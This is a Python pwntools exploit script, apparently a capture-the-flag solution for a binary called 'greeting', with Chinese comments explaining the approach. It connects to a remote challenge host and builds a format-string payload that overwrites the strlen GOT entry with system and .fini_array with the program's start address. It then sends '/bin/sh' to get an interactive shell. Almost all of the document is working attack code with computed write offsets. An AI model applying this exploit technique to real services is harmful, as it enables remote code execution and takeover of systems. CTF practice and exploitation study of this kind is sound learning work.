"""
漏洞点：格式化字符串

思路：
1、前面填充2字节，第12个参数
2、修改strlen地址为system地址
3、修改.fini_array为start的地址，让程序执行第二次
"""
from pwn import *


# p = process("./greeting")
p = remote("61.147.171.105", 59297)
elf = ELF("./greeting")

# context.log_level = "debug"

fini_addr = 0x8049934
start_adrr = 0x80484F0
strlen_got = elf.got['strlen']
system_plt = 0x8048490

payload = b"AA"
payload += p32(fini_addr + 2)  # 一定要先小的，再写大的
payload += p32(strlen_got + 2)
payload += p32(strlen_got)
payload += p32(fini_addr)
payload += b"%2016c%12$hn%13$hn"  # 0x804 - 2 - 4*4 - 18 = 2016，其中“Nice to meet you, ”占了18个字节
payload += b"%31884c%14$hn" # 0x8490 - 0x804 = 31884
payload += b"%96c%15$hn" # 0x84f0 - 0x8490 = 96

p.sendlineafter("Please tell me your name... ", payload)

payload = b"/bin/sh"

p.sendlineafter("Please tell me your name... ", payload)

p.interactive()
